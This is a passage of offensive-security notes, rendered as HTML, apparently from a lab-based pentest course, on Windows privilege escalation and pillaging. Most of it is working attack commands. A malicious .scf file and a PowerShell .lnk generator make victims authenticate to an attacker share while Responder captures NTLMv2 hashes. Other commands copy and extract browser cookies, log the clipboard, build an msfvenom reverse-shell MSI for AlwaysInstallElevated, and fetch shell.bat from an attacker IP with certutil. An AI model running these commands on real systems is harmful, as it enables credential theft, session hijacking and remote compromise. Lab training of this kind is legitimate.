+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>Shell<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Command</span><span class="o">=</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.14.3<span class="se">\s</span>hare<span class="se">\l</span>egit.ico
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Taskbar<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Command</span><span class="o">=</span>ToggleDesktop</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Starting Responder</strong></p>
+<p>Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user&rsquo;s NTLMV2 password hash in our console and attempt to crack it offline.</p>
+<ul>
+<li>Listening :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">p4v1c@htb<span class="o">[</span>/htb<span class="o">]</span>$ sudo responder -wrf -v -I tun0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.129.43.30
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : WINLPE-SRV01<span class="se">\A</span>dministrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...&lt;SNIP&gt;...</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Tools to listen :
+https://github.com/lgandx/Responder
+https://github.com/Kevin-Robertson/Inveigh
+https://github.com/Kevin-Robertson/InveighZero</li>
+</ul>
+<p><strong>Capturing Hashes with a Malicious .lnk File</strong></p>
+<p>This attack no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-shllink/16cb4ca1-9339-4d0c-a68d-bf1d6cc0f943">.lnk</a> file. We can use various tools to generate a malicious .lnk file, such as <a href="https://github.com/dievus/lnkbomb">Lnkbomb</a>, as it is not as straightforward as creating a malicious .scf file. We can also make one using a few lines of PowerShell:</p>
+<ul>
+<li>Generating a Malicious .lnk File</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$objShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">WScript</span><span class="p">.</span><span class="py">Shell</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span> <span class="p">=</span> <span class="nv">$objShell</span><span class="p">.</span><span class="py">CreateShortcut</span><span class="p">(</span><span class="s2">&#34;C:\legit.lnk&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span><span class="p">.</span><span class="py">TargetPath</span> <span class="p">=</span> <span class="s2">&#34;\\&lt;attackerIP&gt;\@pwn.png&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span><span class="p">.</span><span class="py">WindowStyle</span> <span class="p">=</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span><span class="p">.</span><span class="py">IconLocation</span> <span class="p">=</span> <span class="s2">&#34;%windir%\system32\shell32.dll, 3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span><span class="p">.</span><span class="py">Description</span> <span class="p">=</span> <span class="s2">&#34;Browsing to the directory where this file is saved will trigger an auth request.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span><span class="p">.</span><span class="py">HotKey</span> <span class="p">=</span> <span class="s2">&#34;Ctrl+Alt+O&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$lnk</span><span class="p">.</span><span class="py">Save</span><span class="p">()</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="pillaging">Pillaging<a href="#pillaging" class="anchor" aria-hidden="true">#</a> </h4>
+<p><strong>Data Sources</strong></p>
+<p>Below are some of the sources from which we can obtain information from compromised systems:</p>
+<ul>
+<li>Installed applications</li>
+<li>Installed services
+<ul>
+<li>Websites</li>
+<li>File Shares</li>
+<li>Databases</li>
+<li>Directory Services (such as Active Directory, Azure AD, etc.)</li>
+<li>Name Servers</li>
+<li>Deployment Services</li>
+<li>Certificate Authority</li>
+<li>Source Code Management Server</li>
+<li>Virtualization</li>
+<li>Messaging</li>
+<li>Monitoring and Logging Systems</li>
+<li>Backups</li>
+</ul>
+</li>
+<li>Sensitive Data
+<ul>
+<li>Keylogging</li>
+<li>Screen Capture</li>
+<li>Network Traffic Capture</li>
+<li>Previous Audit reports</li>
+</ul>
+</li>
+<li>User Information
+<ul>
+<li>History files, interesting documents (.doc/x,.xls/x,password.<em>/pass.</em>, etc)</li>
+<li>Roles and Privileges</li>
+<li>Web Browsers</li>
+<li>IM Clients</li>
+</ul>
+</li>
+</ul>
+<p><strong>Copy Firefox Cookies Database</strong></p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="nv">$env:APPDATA</span><span class="p">\</span><span class="n">Mozilla</span><span class="p">\</span><span class="n">Firefox</span><span class="p">\</span><span class="n">Profiles</span><span class="p">\*.</span><span class="nb">default-release</span><span class="p">\</span><span class="n">cookies</span><span class="p">.</span><span class="py">sqlite</span> <span class="p">.</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Download CookieExtractor :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Extract website Cookie  from Database :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 cookieextractor.py --dbpath <span class="s2">&#34;/home/plaintext/cookies.sqlite&#34;</span> --host slack --cookie d</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Clipboard</strong></p>
+<ul>
+<li>Download ClipboardLogger :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Monitor the Clipboard:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Invoke-ClipboardLogger</span></span></span></code></pre></div>
+  </figure>
+</div>
+<h4 id="miscellaneous-techniques">Miscellaneous Techniques<a href="#miscellaneous-techniques" class="anchor" aria-hidden="true">#</a> </h4>
+<p><strong>Always Install Elevated</strong></p>
+<ul>
+<li>Enumerating Always Install Elevated Settings :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"> <span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span>
+</span></span><span class="line"><span class="cl"> <span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Generating MSI Package</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"> msfvenom -p windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>10.10.14.3 <span class="nv">lport</span><span class="o">=</span><span class="m">9443</span> -f msi &gt; aie.msi</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Executing MSI Package:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Scheduled Tasks</strong></p>
+<ul>
+<li>Enumerating Scheduled Tasks :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"> schtasks /query /fo LIST /v
+</span></span><span class="line"><span class="cl"> schtasks /query /v /fo LIST <span class="p">&gt;</span> tasklist.txt</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Speed Up the task :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">Get-ScheduledTask -TaskName <span class="s2">&#34;Daily_Checkup&#34;</span> <span class="p">|</span> Start-ScheduledTask</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerating Scheduled Tasks with powershell :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">select </span><span class="n">TaskName</span><span class="p">,</span><span class="n">State</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>User/Computer Description Field</strong></p>
+<ul>
+<li>Checking Local User Description Field:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-LocalUser</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Enumerating Computer Description Field</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_OperatingSystem</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Description</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Mount VHDX/VMDK</strong></p>
+<ul>
+<li>Mount VMDK on Linux</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Mount VHD/VHDX on Linux</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Retrieving Hashes using Secretsdump.py</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL</span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="ressources">Ressources<a href="#ressources" class="anchor" aria-hidden="true">#</a> </h3>
+<ul>
+<li>Download Runas</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">wget https://github.com/antonioCoco/RunasCs</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Switch user cmd</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">RunasCs.exe Administrator password <span class="s2">&#34;cmd /c whoami &#34;</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Bypass Powershell Policy</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code class="language-powershell-session" data-lang="powershell-session">Set-ExecutionPolicy Bypass -Scope Process</code></pre>
+  </figure>
+</div>
+<ul>
+<li>
+<p>Compiled Tools :
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</p>
+</li>
+<li>
+<p>Grep on Windows :</p>
+</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cat file.txt <span class="p">|</span> Select-String password</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>
+<p>Living Off The Land Binaries and Scripts (LOLBAS):
+https://lolbas-project.github.io/#</p>
+</li>
+<li>
+<p>Transferring File with Certutil :</p>
+</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">certutil</span><span class="p">.</span><span class="py">exe</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">3</span><span class="err">:</span><span class="mf">8080</span><span class="p">/</span><span class="n">shell</span><span class="p">.</span><span class="py">bat</span> <span class="n">shell</span><span class="p">.</span><span class="n">bat</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Encoding File with Certutil :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code class="language-cmd-session" data-lang="cmd-session">certutil -encode file1 encodedfile</code></pre>
+  </figure>
+</div>
+<ul>
+<li>Decoding File with Certutil</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <pre tabindex="0"><code class="language-cmd-session" data-lang="cmd-session"> certutil -decode encodedfile file2</code></pre>
+  </figure>
+</div>
+<ul>
+<li>Run DLL :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll</span></span></code></pre></div>
+  </figure>
+</div>
+<p>#Windows_Tools
+<strong>Some Automated Tools</strong></p>
+<ul>
+<li>WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS</li>
+<li>Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation</li>
+<li>Sherlock - https://github.com/rasta-mouse/Sherlock</li>
+<li>Watson - https://github.com/rasta-mouse/Watson</li>
+<li>PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</li>
+<li>JAWS - https://github.com/411Hall/JAWS</li>
+<li>Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester</li>
+<li>Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/</li>
+<li>https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpDPAPI.exe</li>
+<li>Seatbelt - https://github.com/GhostPack/Seatbelt</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">Seatbelt.exe -group<span class="o">=</span>all -full</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>SharpUp - https://github.com/GhostPack/</li>
+<li>Privesc Check  https://github.com/itm4n/PrivescCheck</li>
+</ul>
+<p>cmd /c &ldquo;curl http://10.8.3.12:8080/PrivescCheck.ps1 &gt; PrivescCheck.ps1 &quot;</p>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card w-100">
+			<div class="card-body d-flex">
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M5 12l6 6"></path>
+						<path d="M5 12l6 -6"></path>
+				 	</svg>
+				</div>
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Prev</div>
+					<a href="/notes/web/web-cache/" class="stretched-link text-reset text-decoration-none">Web Cache</a>
+				</div>
+			</div>
+		</div>
+	<div class="m-2"></div>
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/notes/web/wordpress/" class="stretched-link text-reset text-decoration-none">Wordpress</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async
+  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
+  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
+  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
+</script>
+<script async
+  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
+  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
+</script>
+
+    
+  </body>
+</html>
